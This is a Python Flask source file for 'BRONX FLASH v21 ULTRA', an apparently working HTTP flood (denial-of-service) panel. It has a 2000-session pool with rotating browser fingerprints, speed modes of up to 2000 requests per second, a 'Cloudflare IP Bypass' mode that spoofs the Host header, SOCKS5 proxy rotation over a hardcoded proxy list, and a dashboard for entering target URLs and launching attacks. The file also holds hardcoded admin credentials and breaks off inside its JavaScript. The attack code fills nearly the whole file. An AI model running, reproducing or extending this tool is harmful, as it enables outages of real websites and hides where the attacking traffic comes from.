from flask import Flask, request, jsonify, render_template_string, make_response
import requests
import threading
import time
import random
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor
import urllib3
import json
import os
import queue
import uuid
from collections import defaultdict
urllib3.disable_warnings()

app = Flask(__name__)

ADMIN_USER = "bronx"
ADMIN_PASS = "ultra2026"

# ============================================
# ULTRA SESSION POOL (2000 Sessions)
# ============================================
session_pool = []
session_lock = threading.Lock()
MAX_SESSIONS = 2000

def create_session():
    """Create a fresh session with unique fingerprint"""
    s = requests.Session()
    s.headers.update({
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
        ]),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8", "es-ES,es;q=0.9"]),
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
    })
    return s

def initialize_session_pool():
    """Initialize the 2000 session pool"""
    global session_pool
    with session_lock:
        print(f"🚀 Creating {MAX_SESSIONS} sessions...")
        for i in range(MAX_SESSIONS):
            session_pool.append(create_session())
            if (i + 1) % 200 == 0:
                print(f"   📦 {i + 1}/{MAX_SESSIONS} sessions created")
    print(f"✅ Session pool initialized with {len(session_pool)} sessions")

def get_session():
    """Get a random session from the pool"""
    with session_lock:
        if not session_pool:
            # Emergency refill
            for _ in range(100):
                session_pool.append(create_session())
        return random.choice(session_pool)

def refresh_session_pool():
    """Periodically refresh sessions to keep them fresh"""
    while True:
        time.sleep(300)  # Every 5 minutes
        with session_lock:
            # Refresh 10% of sessions
            refresh_count = MAX_SESSIONS // 10
            for _ in range(refresh_count):
                if session_pool:
                    session_pool.pop(0)
                    session_pool.append(create_session())
        print(f"🔄 Refreshed {refresh_count} sessions")

# ============================================
# MULTI-SESSION ATTACK SYSTEM
# ============================================
active_attacks = {}
attack_stats = {"success": 0, "failed": 0, "total": 0}
attack_logs = []
custom_proxies = []
total_lifetime = {"success": 0, "failed": 0, "total": 0}
rate_limit_config = {"enabled": False, "rpm": 15}
multi_session_config = {"enabled": True, "sessions_per_url": 50, "rotating": True}
ip_log = []

CF_IPS = [
    "104.21.0.1","104.21.0.2","104.21.0.3","104.21.0.4","104.21.0.5",
    "104.16.0.1","104.16.0.2","104.16.0.3",
    "172.67.0.1","172.67.0.2"
]

SOCKS5_PROXIES = [
    "94.158.244.245:1080","68.71.249.153:48606","72.56.107.177:1080",
    "176.114.86.151:1080","43.161.217.219:1080","208.102.51.6:58208",
    "162.253.68.97:4145","167.71.32.51:1080","23.176.40.194:1080",
    "173.212.239.43:1080"
]

# Speed configurations (Enhanced for multi-session)
SPEEDS = {
    "slow": {"rate": 2, "delay": 0.2, "workers": 5, "sessions": 10},
    "fast": {"rate": 5, "delay": 0.15, "workers": 10, "sessions": 25},
    "veryfast": {"rate": 10, "delay": 0.1, "workers": 25, "sessions": 50},
    "ultra": {"rate": 50, "delay": 0.05, "workers": 50, "sessions": 100},
    "lightning": {"rate": 100, "delay": 0.02, "workers": 100, "sessions": 200},
    "flash": {"rate": 500, "delay": 0.001, "workers": 200, "sessions": 500},
    "godkiller": {"rate": 1000, "delay": 0.0005, "workers": 400, "sessions": 1000},
    "ultragod": {"rate": 2000, "delay": 0.0001, "workers": 500, "sessions": 2000}
}

EFFECTS = ["snow","matrix","particles","neon","firefly","glitch","pulse","scanlines","bubbles","stars","cyber","quantum"]

# ============================================
# ULTRA ATTACK WORKER (Multi-Session)
# ============================================
def send_request_with_session(url, session, mode, proxy=None):
    """Send request using specific session"""
    try:
        if mode == "cf":
            cf_ip = random.choice(CF_IPS)
            headers = {"Host": url.split("//")[-1].split("/")[0]}
            session.get(f"https://{cf_ip}", headers=headers, timeout=5, verify=False)
            return True
        elif mode == "socks5" and proxy:
            proxies = {"http": f"socks5://{proxy}", "https": f"socks5://{proxy}"}
            session.get(url, proxies=proxies, timeout=5, verify=False)
            return True
        else:
            session.get(url, timeout=5, verify=False)
            return True
    except:
        return False

def attack_worker_multi(attack_id, url, total_count, delay, mode, use_proxy, sessions_per_url):
    """Attack worker with multiple sessions"""
    sessions = [get_session() for _ in range(sessions_per_url)]
    proxy_list = custom_proxies + SOCKS5_PROXIES if use_proxy else []
    
    count_per_session = max(1, total_count // len(sessions))
    
    def session_attack(session, count):
        for _ in range(count):
            if attack_id not in active_attacks:
                break
            
            # Rate limiter
            if rate_limit_config["enabled"]:
                time.sleep(60 / rate_limit_config["rpm"])
            
            proxy = random.choice(proxy_list) if proxy_list else None
            
            # Rotate session if configured
            if multi_session_config["rotating"] and random.random() < 0.1:
                session = get_session()
            
            success = send_request_with_session(url, session, mode, proxy)
            
            with threading.Lock():
                if success:
                    attack_stats["success"] += 1
                    total_lifetime["success"] += 1
                else:
                    attack_stats["failed"] += 1
                    total_lifetime["failed"] += 1
                attack_stats["total"] += 1
                total_lifetime["total"] += 1
            
            if delay > 0:
                time.sleep(delay)
    
    # Launch all sessions in parallel
    threads = []
    for session in sessions:
        t = threading.Thread(target=session_attack, args=(session, count_per_session))
        t.daemon = True
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join(timeout=300)

def run_attack_multi(attack_id, urls, count, speed, mode, use_proxy):
    """Run multi-session attack"""
    config = SPEEDS.get(speed, SPEEDS["flash"])
    
    if multi_session_config["enabled"]:
        sessions_per_url = min(config["sessions"], multi_session_config["sessions_per_url"])
    else:
        sessions_per_url = 5  # Default
    
    workers_per_url = max(1, config["workers"] // len(urls))
    
    with ThreadPoolExecutor(max_workers=min(config["workers"], 500)) as executor:
        for url in urls:
            for _ in range(workers_per_url):
                executor.submit(
                    attack_worker_multi,
                    attack_id, url,
                    count // workers_per_url,
                    config["delay"],
                    mode,
                    use_proxy,
                    sessions_per_url
                )
    
    if attack_id in active_attacks:
        del active_attacks[attack_id]
    
    attack_logs.append(f"✅ Attack completed: {len(urls)} targets")

# ============================================
# HTML TEMPLATES (Ultra Enhanced)
# ============================================
LOGIN = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>BRONX FLASH v21 ULTRA</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:'Segoe UI',system-ui,sans-serif;overflow:hidden}
body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(circle,rgba(255,0,85,0.05) 1px,transparent 1px);background-size:35px 35px;animation:bgMove 20s linear infinite}
@keyframes bgMove{0%{transform:translate(0)}100%{transform:translate(35px,35px)}}
.effect-layer{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0}
.box{background:rgba(5,0,10,0.97);padding:50px;border-radius:24px;border:1px solid rgba(255,0,85,0.2);width:420px;text-align:center;z-index:1;box-shadow:0 0 100px rgba(255,0,85,0.15),0 0 200px rgba(0,200,255,0.05);animation:pulseBox 3s infinite}
@keyframes pulseBox{50%{box-shadow:0 0 150px rgba(255,0,85,0.3),0 0 250px rgba(0,200,255,0.1)}}
.logo{font-size:4em;animation:glow 2s infinite}@keyframes glow{50%{filter:drop-shadow(0 0 30px rgba(255,0,85,0.8))}}
h1{font-size:2em;font-weight:800;background:linear-gradient(135deg,#ff0055,#ffd700,#00c8ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:3px;animation:textShine 3s infinite}
@keyframes textShine{50%{filter:brightness(1.3)}}
.tag{color:#666;font-size:0.7em;letter-spacing:5px;text-transform:uppercase;margin:10px 0}
input{width:100%;padding:16px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.08);border-radius:12px;color:#fff;margin:10px 0;font-size:15px;transition:0.3s}
input:focus{border-color:#ff0055;box-shadow:0 0 30px rgba(255,0,85,0.2);outline:none}
.btn{width:100%;padding:16px;background:linear-gradient(135deg,#ff0055,#ffd700);color:#000;border:none;border-radius:12px;font-weight:700;cursor:pointer;font-size:15px;margin-top:15px;letter-spacing:3px;text-transform:uppercase;transition:0.4s;position:relative;overflow:hidden}
.btn:hover{box-shadow:0 0 60px rgba(255,0,85,0.7);transform:translateY(-3px)}.btn:active{transform:scale(0.95)}
.btn::after{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:linear-gradient(45deg,transparent,rgba(255,255,255,0.2),transparent);animation:btnShine 2s infinite}
@keyframes btnShine{0%{transform:translateX(-100%) rotate(45deg)}100%{transform:translateX(100%) rotate(45deg)}}
.version-badge{display:inline-block;padding:8px 20px;background:rgba(255,0,85,0.1);border:1px solid rgba(255,0,85,0.3);border-radius:20px;color:#ff0055;font-size:0.65em;letter-spacing:3px;margin-top:10px;animation:badgePulse 2s infinite}
@keyframes badgePulse{50%{box-shadow:0 0 30px rgba(255,0,85,0.3)}}
</style></head><body>
<div class="effect-layer" id="effects"></div>
<div class="box">
<div class="logo">💀</div>
<h1>BRONX FLASH</h1>
<div class="tag">v21 ULTRA • GOD KILLER</div>
<p style="color:#555;font-size:0.6em;letter-spacing:2px">2000 SESSIONS • MULTI-THREAD • ULTRA SPEED</p>
<div class="version-badge">⚡ 2000x SESSION ENGINE ⚡</div>
<form method="post">
<input type="text" name="user" placeholder="Username">
<input type="password" name="pass" placeholder="Password">
<button class="btn" type="submit">☠️ ACCESS SYSTEM</button>
</form>
{% if error %}<p style="color:#ff0055;margin-top:10px">{{ error }}</p>{% endif %}
</div>
<script>
let effect='{{ effect }}';
let el=document.getElementById('effects');
function createSnow(){let d=document.createElement('div');d.style.cssText='position:absolute;color:#ff0055;font-size:'+(Math.random()*10+8)+'px;left:'+Math.random()*100+'%;animation:fall '+Math.random()*5+3+'s linear infinite;pointer-events:none';d.innerHTML='❄️';el.appendChild(d)}
function createMatrix(){let d=document.createElement('div');d.style.cssText='position:absolute;color:#00ff88;font-size:'+(Math.random()*12+6)+'px;left:'+Math.random()*100+'%;animation:fall '+Math.random()*3+2+'s linear infinite;pointer-events:none';d.innerHTML=String.fromCharCode(0x30A0+Math.random()*96);el.appendChild(d)}
function createParticle(){let d=document.createElement('div');d.style.cssText='position:absolute;width:'+(Math.random()*3+1)+'px;height:'+(Math.random()*3+1)+'px;background:#ffd700;left:'+Math.random()*100+'%;animation:float '+Math.random()*4+3+'s ease-in-out infinite;border-radius:50%;pointer-events:none';el.appendChild(d)}
function createCyber(){let d=document.createElement('div');d.style.cssText='position:absolute;color:#00c8ff;font-size:'+(Math.random()*14+8)+'px;left:'+Math.random()*100+'%;animation:cyberFall '+Math.random()*2+1+'s linear infinite;pointer-events:none';d.innerHTML=Math.random()>0.5?'▓':'▒';el.appendChild(d)}
if(effect==='snow')for(let i=0;i<40;i++)createSnow();
if(effect==='matrix')for(let i=0;i<50;i++)createMatrix();
if(effect==='particles')for(let i=0;i<30;i++)createParticle();
if(effect==='cyber')for(let i=0;i<40;i++)createCyber();
if(effect==='neon'){el.style.background='radial-gradient(circle,rgba(255,0,85,0.05),transparent)';el.style.animation='pulseNeon 2s infinite'}
if(effect==='stars')for(let i=0;i<20;i++){let s=document.createElement('div');s.style.cssText='position:absolute;width:2px;height:2px;background:#fff;left:'+Math.random()*100+'%;top:'+Math.random()*100+'%;animation:twinkle '+Math.random()*2+1+'s infinite;pointer-events:none';el.appendChild(s)}
if(effect==='quantum')for(let i=0;i<25;i++){let q=document.createElement('div');q.style.cssText='position:absolute;width:4px;height:4px;background:#ffd700;left:'+Math.random()*100+'%;top:'+Math.random()*100+'%;animation:quantum '+Math.random()*3+2+'s infinite;border-radius:50%;box-shadow:0 0 20px #ffd700;pointer-events:none';el.appendChild(q)}
</script>
<style>
@keyframes fall{to{transform:translateY(110vh) rotate(360deg)}}
@keyframes cyberFall{to{transform:translateY(110vh)}}
@keyframes float{0%,100%{transform:translateY(0)scale(1)}50%{transform:translateY(-30px)scale(1.5)}}
@keyframes pulseNeon{50%{opacity:0.6}}
@keyframes twinkle{50%{opacity:0.2}}
@keyframes quantum{0%,100%{transform:translate(0,0)scale(1);opacity:1}25%{transform:translate(20px,-20px)scale(1.5);opacity:0.5}50%{transform:translate(-20px,10px)scale(0.8);opacity:0.8}75%{transform:translate(10px,20px)scale(1.3);opacity:0.3}}
</style>
</body></html>"""

DASH = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>BRONX FLASH v21 ULTRA</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#e0e0e0;font-family:'Segoe UI',system-ui,sans-serif;padding:20px;line-height:1.5}
.container{max-width:1400px;margin:0 auto}
.header{display:flex;justify-content:space-between;align-items:center;padding:20px 30px;border:1px solid rgba(255,255,255,0.06);border-radius:16px;margin-bottom:20px;background:rgba(255,255,255,0.01);flex-wrap:wrap;gap:15px;animation:headerGlow 3s infinite}
@keyframes headerGlow{50%{border-color:rgba(255,0,85,0.3);box-shadow:0 0 30px rgba(255,0,85,0.1)}}
.header h1{font-size:1.8em;font-weight:800;background:linear-gradient(135deg,#ff0055,#ffd700,#00c8ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:4px}
.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:20px}
.stat{background:rgba(255,255,255,0.01);border:1px solid rgba(255,255,255,0.05);border-radius:14px;padding:20px;text-align:center;transition:0.3s}.stat:hover{border-color:#ff0055;box-shadow:0 0 20px rgba(255,0,85,0.2)}
.stat-val{font-size:2.5em;font-weight:800}.s{color:#00ff88}.f{color:#ff0055}.t{color:#ffd700}
.stat-label{font-size:0.6em;text-transform:uppercase;letter-spacing:3px;color:#555;margin-top:5px}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(380px,1fr));gap:16px;margin-bottom:20px}
.card{background:rgba(255,255,255,0.01);border:1px solid rgba(255,255,255,0.05);border-radius:14px;padding:24px;transition:0.3s}.card:hover{border-color:rgba(255,0,85,0.2)}
.card h3{font-size:0.75em;font-weight:600;letter-spacing:3px;text-transform:uppercase;margin-bottom:16px;color:#666}
input,select,textarea{width:100%;padding:12px 15px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:8px;color:#fff;margin:5px 0;font-size:13px;font-family:inherit;resize:vertical;transition:0.2s}
input:focus,select:focus,textarea:focus{border-color:#ff0055;box-shadow:0 0 20px rgba(255,0,85,0.15);outline:none}
label{font-size:0.6em;text-transform:uppercase;letter-spacing:2px;color:#555;display:block;margin-top:10px}
.btn{width:100%;padding:13px;background:linear-gradient(135deg,#ff0055,#ffd700);color:#000;border:none;border-radius:8px;font-weight:600;cursor:pointer;font-size:0.75em;letter-spacing:2px;text-transform:uppercase;transition:0.3s;margin:5px 0;position:relative;overflow:hidden}
.btn:hover{box-shadow:0 0 40px rgba(255,0,85,0.5);transform:translateY(-2px)}.btn:active{transform:scale(0.96)}
.btn::after{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:linear-gradient(45deg,transparent,rgba(255,255,255,0.2),transparent);animation:shine 2s infinite}
@keyframes shine{0%{transform:translateX(-100%) rotate(45deg)}100%{transform:translateX(100%) rotate(45deg)}}
.btn-secondary{background:rgba(255,255,255,0.03);color:#888;border:1px solid rgba(255,255,255,0.1)}.btn-secondary:hover{box-shadow:0 0 20px rgba(255,255,255,0.1);color:#fff}
.btn-danger{background:rgba(255,0,0,0.15);color:#ff4444;border:1px solid rgba(255,0,0,0.2)}.btn-danger:hover{box-shadow:0 0 25px rgba(255,0,0,0.3)}
.btn-reset{background:rgba(255,215,0,0.15);color:#ffd700;border:1px solid rgba(255,215,0,0.2)}.btn-reset:hover{box-shadow:0 0 25px rgba(255,215,0,0.3)}
.btn-green{background:rgba(0,255,136,0.15);color:#00ff88;border:1px solid rgba(0,255,136,0.2)}.btn-green:hover{box-shadow:0 0 25px rgba(0,255,136,0.3)}
.btn-cyan{background:rgba(0,200,255,0.15);color:#00c8ff;border:1px solid rgba(0,200,255,0.2)}.btn-cyan:hover{box-shadow:0 0 25px rgba(0,200,255,0.3)}
.row{display:grid;grid-template-columns:1fr 1fr;gap:10px}.row3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px}.row4{display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:8px}
.logs{background:rgba(0,0,0,0.6);border:1px solid rgba(255,255,255,0.04);border-radius:10px;padding:15px;max-height:300px;overflow:auto;font-size:0.7em;font-family:'SF Mono',monospace;color:#00ff88}
.log-e{padding:4px 0;border-bottom:1px solid rgba(255,255,255,0.02);color:#888}
.badge{display:inline-block;padding:5px 14px;border-radius:20px;font-size:0.6em;letter-spacing:2px;text-transform:uppercase}
.badge-active{background:rgba(255,0,85,0.15);color:#ff0055;animation:blink 1s infinite}@keyframes blink{50%{opacity:0.4}}
.badge-on{background:rgba(0,255,136,0.15);color:#00ff88}
.badge-multi{background:rgba(0,200,255,0.15);color:#00c8ff;animation:blink 1s infinite}
.toggle-row{display:flex;align-items:center;gap:12px;margin:10px 0}
.toggle{width:44px;height:24px;background:rgba(255,255,255,0.08);border-radius:12px;cursor:pointer;position:relative;transition:0.3s}
.toggle.on{background:#ff0055;box-shadow:0 0 20px rgba(255,0,85,0.4)}.toggle::after{content:'';position:absolute;top:2px;left:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:0.3s}.toggle.on::after{left:22px}
.footer{text-align:center;padding:20px;color:rgba(255,255,255,0.15);font-size:0.6em;letter-spacing:3px}
.effect-select{display:flex;flex-wrap:wrap;gap:5px;margin:5px 0}
.effect-opt{padding:6px 12px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);border-radius:20px;color:#666;font-size:0.6em;cursor:pointer;transition:0.2s;letter-spacing:1px}
.effect-opt:hover,.effect-opt.active{border-color:#ff0055;color:#ff0055;background:rgba(255,0,85,0.1)}
.session-info{background:rgba(0,200,255,0.05);border:1px solid rgba(0,200,255,0.15);border-radius:10px;padding:15px;margin:10px 0;text-align:center}
.session-count{font-size:3em;font-weight:800;color:#00c8ff;animation:sessionPulse 2s infinite}
@keyframes sessionPulse{50%{text-shadow:0 0 40px rgba(0,200,255,0.6)}}
</style></head><body>
<div class="container">
<div class="header">
<div><h1>⚡ BRONX FLASH v21 ULTRA</h1><div style="color:#555;font-size:0.6em;letter-spacing:3px">2000 SESSIONS • GOD KILLER • MULTI-THREAD ENGINE</div></div>
<div style="display:flex;gap:10px;align-items:center">
<span style="color:#666;font-size:0.6em" id="liveTime"></span>
<a href="/logout" style="color:#ff0055;text-decoration:none;font-size:0.7em;letter-spacing:2px">DISCONNECT</a>
</div>
</div>

<div class="stats">
<div class="stat"><div class="stat-val s" id="success">0</div><div class="stat-label">✅ Success</div></div>
<div class="stat"><div class="stat-val f" id="failed">0</div><div class="stat-label">❌ Failed</div></div>
<div class="stat"><div class="stat-val t" id="total">0</div><div class="stat-label">📊 Session Total</div></div>
</div>

<div class="stats" style="grid-template-columns:repeat(4,1fr)">
<div class="stat"><div class="stat-val t" id="ltSuccess">0</div><div class="stat-label">🏆 Lifetime Success</div></div>
<div class="stat"><div class="stat-val t" id="ltTotal">0</div><div class="stat-label">📊 Lifetime Total</div></div>
<div class="stat"><div class="stat-val" style="color:#00c8ff" id="activeSessions">0</div><div class="stat-label">🔗 Active Sessions</div></div>
<div class="stat"><div class="stat-val" style="color:#ffd700" id="poolSize">2000</div><div class="stat-label">📦 Session Pool</div></div>
</div>

<div class="grid">
<div class="card">
<h3>🎯 Attack Configuration</h3>
<label>Target URLs (One per line)</label>
<textarea id="urls" rows="3" placeholder="https://target1.com&#10;https://target2.com"></textarea>
<div class="row"><div><label>Requests per URL</label><input type="number" id="count" value="5000"></div><div>
<label>Speed Mode</label><select id="speed">
<option value="slow">🐢 Slow (2/s)</option>
<option value="fast">⚡ Fast (5/s)</option>
<option value="veryfast">🔥 Very Fast (10/s)</option>
<option value="ultra">💀 Ultra (50/s)</option>
<option value="lightning">⚡ Lightning (100/s)</option>
<option value="flash">💎 FLASH (500/s)</option>
<option value="godkiller">☠️ GOD KILLER (1000/s)</option>
<option value="ultragod" selected>👑 ULTRA GOD (2000/s)</option>
</select></div></div>
<label>Attack Mode</label><select id="mode">
<option value="direct">Direct (Fastest)</option>
<option value="cf">Cloudflare IP Bypass</option>
<option value="socks5">SOCKS5 Proxy</option>
<option value="mixed">Mixed (All Methods)</option>
</select>
<button class="btn" onclick="start()">🚀 LAUNCH ATTACK</button>
<button class="btn btn-danger" onclick="stop()">⏹️ TERMINATE ALL</button>
<div id="status" style="margin-top:8px"></div>
</div>

<div class="card">
<h3>⚡ Multi-Session Engine (NEW!)</h3>
<div class="session-info">
<div class="session-count" id="sessionDisplay">2000</div>
<div style="color:#888;font-size:0.6em;letter-spacing:2px">ACTIVE SESSION POOL</div>
</div>
<div class="toggle-row"><span style="font-size:0.7em;color:#666">Multi-Session Mode</span><div class="toggle on" id="multiToggle" onclick="toggleMulti()"></div><span id="multiLabel" style="font-size:0.7em;color:#00c8ff">ON</span></div>
<div class="toggle-row"><span style="font-size:0.7em;color:#666">Session Rotation</span><div class="toggle on" id="rotateToggle" onclick="toggleRotate()"></div><span id="rotateLabel" style="font-size:0.7em;color:#00c8ff">ON</span></div>
<label>Sessions Per URL</label><input type="number" id="sessionsPerUrl" value="50" min="1" max="2000">
<label>Session Pool Size</label><input type="number" id="poolSizeInput" value="2000" min="100" max="2000">
<button class="btn btn-cyan" onclick="saveMultiSession()">💾 Save Multi-Session Config</button>
<button class="btn btn-reset" onclick="refreshSessions()">🔄 Refresh Session Pool</button>
</div>

<div class="card">
<h3>⚙️ Rate Limiter</h3>
<div class="toggle-row"><span style="font-size:0.7em;color:#666">Rate Limiter</span><div class="toggle" id="rateToggle" onclick="toggleRate()"></div><span id="rateLabel" style="font-size:0.7em;color:#666">OFF</span></div>
<label>Requests Per Minute (RPM)</label><input type="number" id="rpm" value="15">
<button class="btn btn-secondary" onclick="saveRate()">💾 Save RPM</button>
</div>

<div class="card">
<h3>🔧 Proxy System</h3>
<div class="toggle-row"><span style="font-size:0.7em;color:#666">Proxy System</span><div class="toggle" id="proxyToggle" onclick="toggleProxy()"></div><span id="proxyLabel" style="font-size:0.7em;color:#666">OFF</span></div>
<label>Custom Proxies (IP:Port)</label>
<textarea id="customProxies" rows="2" placeholder="94.158.244.245:1080"></textarea>
<button class="btn btn-secondary" onclick="saveProxies()">💾 Save Proxies</button>
</div>

<div class="card">
<h3>🌐 Network Info</h3>
<div style="font-size:1.5em;color:#ffd700;text-align:center;padding:10px" id="browserIP">Loading...</div>
<button class="btn btn-secondary" onclick="copyIP()">📋 Copy IP</button>
<button class="btn btn-cyan" onclick="testLatency()">📡 Test Latency</button>
<div id="latencyResult" style="margin-top:8px;text-align:center"></div>
</div>

<div class="card">
<h3>🎨 Visual Effects</h3>
<div class="effect-select" id="effectSelect">
{% for e in effects %}<span class="effect-opt" onclick="setEffect('{{e}}')">{{e}}</span>{% endfor %}
</div>
<div class="row" style="margin-top:10px">
<button class="btn btn-reset" onclick="resetStats()">🔄 Reset Session</button>
<button class="btn btn-reset" onclick="resetLifetime()">🗑️ Reset Lifetime</button>
</div>
</div>

<div class="card">
<h3>📊 Quick Stats</h3>
<div class="row3">
<div class="stat"><div class="stat-val t" style="font-size:1.5em" id="successRate">0%</div><div class="stat-label">Success Rate</div></div>
<div class="stat"><div class="stat-val s" style="font-size:1.5em" id="rps">0</div><div class="stat-label">Req/Sec</div></div>
<div class="stat"><div class="stat-val" style="font-size:1.5em;color:#00c8ff" id="threadCount">0</div><div class="stat-label">Threads</div></div>
</div>
</div>
</div>

<div class="card"><h3>📜 Battle Logs</h3><div class="logs" id="logs"><div class="log-e">💀 BRONX FLASH v21 ULTRA - 2000 Sessions Ready</div><div class="log-e">⚡ Multi-Session Engine: ACTIVE</div><div class="log-e">🔗 Session Pool: 2000 sessions loaded</div><div class="log-e">System armed. Awaiting command...</div></div></div>
<div class="footer">💀 BRONX FLASH v21 ULTRA • 2000 SESSIONS • GOD KILLER ENGINE • MULTI-THREAD 💀</div>
</div>

<script>
let proxyOn=false,rateOn=false,multiOn=true,rotateOn=true;

function toggleProxy(){proxyOn=!proxyOn;document.getElementById('proxyToggle').classList.toggle('on',proxyOn);document.getElementById('proxyLabel').textContent=proxyOn?'ON':'OFF'}
function toggleRate(){rateOn=!rateOn;document.getElementById('rateToggle').classList.toggle('on',rateOn);document.getElementById('rateLabel').textContent=rateOn?'ON':'OFF'}
function toggleMulti(){multiOn=!multiOn;document.getElementById('multiToggle').classList.toggle('on',multiOn);document.getElementById('multiLabel').textContent=multiOn?'ON':'OFF';document.getElementById('multiLabel').style.color=multiOn?'#00c8ff':'#666'}
function toggleRotate(){rotateOn=!rotateOn;document.getElementById('rotateToggle').classList.toggle('on',rotateOn);document.getElementById('rotateLabel').textContent=rotateOn?'ON':'OFF';document.getElementById('rotateLabel').style.color=rotateOn?'#00c8ff':'#666'}

function saveRate(){
    let rpm=document.getElementById('rpm').value;
    fetch('/rate',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({enabled:rateOn,rpm:parseInt(rpm)})}).then(r=>r.json()).then(d=>alert(d.status));
}

function saveProxies(){
    let p=document.getElementById('customProxies').value;
    fetch('/save_proxies',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({proxies:p})}).then(r=>r.json()).then(d=>alert(d.status));
}

function saveMultiSession(){
    let sessions=document.getElementById('sessionsPerUrl').value;
    let poolSize=document.getElementById('poolSizeInput').value;
    fetch('/multi_session',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({enabled:multiOn,sessions_per_url:parseInt(sessions),rotating:rotateOn,pool_size:parseInt(poolSize)})}).then(r=>r.json()).then(d=>alert(d.status));
}

function refreshSessions(){
    fetch('/refresh_sessions',{method:'POST'}).then(r=>r.json()).then(d=>{
        alert(d.status);
        document.getElementById('sessionDisplay').textContent=d.pool_size;
        document.getElementById('poolSize').textContent=d.pool_size;
        document.getElementById('activeSessions').textContent=d.active;
    });
}

function setEffect(e){
    fetch('/effect/'+e).then(()=>{
        document.querySelectorAll('.effect-opt').forEach(el=>el.classList.remove('active'));
        event.target.classList.add('active');
    });
}

function resetStats(){
    fetch('/reset',{method:'POST'}).then(()=>u());
}

function resetLifetime(){
    if(confirm('Reset ALL lifetime stats?')){
        fetch('/reset_lifetime',{method:'POST'}).then(()=>u());
    }
}

function copyIP(){
    let ip=document.getElementById('browserIP').textContent;
    navigator.clipboard.writeText(ip);
    alert('IP Copied: '+ip);
}

function testLatency(){
    let start=Date.now();
    document.getElementById('latencyResult').innerHTML='<span style="color:#ffd700">Testing...</span>';
    fetch('/ping').then(r=>r.json()).then(d=>{
        let lat=Date.now()-start;
        document.getElementById('latencyResult').innerHTML='<span style="color:#00ff88">'+lat+'ms</span>';
    });
}

function u(){
    fetch('/stats').then(r=>r.json()).then(d=>{
        document.getElementById('success').textContent=d.success;
        document.getElementById('failed').textContent=d.failed;
        document.getElementById('total').textContent=d.total;
        document.getElementById('ltSuccess').textContent=d.lt_success;
        document.getElementById('ltTotal').textContent=d.lt_total;
        document.getElementById('activeSessions').textContent=d.active_attacks||0;
        
        let total=d.success+d.failed;
        let rate=total>0?((d.success/total)*100).toFixed(1):0;
        document.getElementById('successRate').textContent=rate+'%';
        document.getElementById('rps').textContent=Math.floor(total/60);
    });
}

function l(){
    fetch('/logs').then(r=>r.json()).then(d=>{
        document.getElementById('logs').innerHTML=d.logs.map(x=>`<div class="log-e">${x}</div>`).join('');
    });
}

function start(){
    let urls=document.getElementById('urls').value.split('\\n').filter(u=>u.trim());
    let count=document.getElementById('count').value;
    let speed=document.getElementById('speed').value;
    let mode=document.getElementById('mode').value;
    
    if(urls.length==0)return;
    
    fetch('/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({
        urls,count:parseInt(count),speed,mode,proxy:proxyOn
    })}).then(r=>r.json()).then(d=>{
        document.getElementById('status').innerHTML='<span class="badge badge-multi">⚡ MULTI-SESSION ACTIVE</span>';
        l();u();
    });
}

function stop(){
    fetch('/stop',{method:'POST'}).then(()=>{
        document.getElementById('status').innerHTML='<span style="color:#666">All Attacks Terminated</span>';
        l();
    });
}

// Initialize
fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{document.getElementById('browserIP').textContent=d.ip});
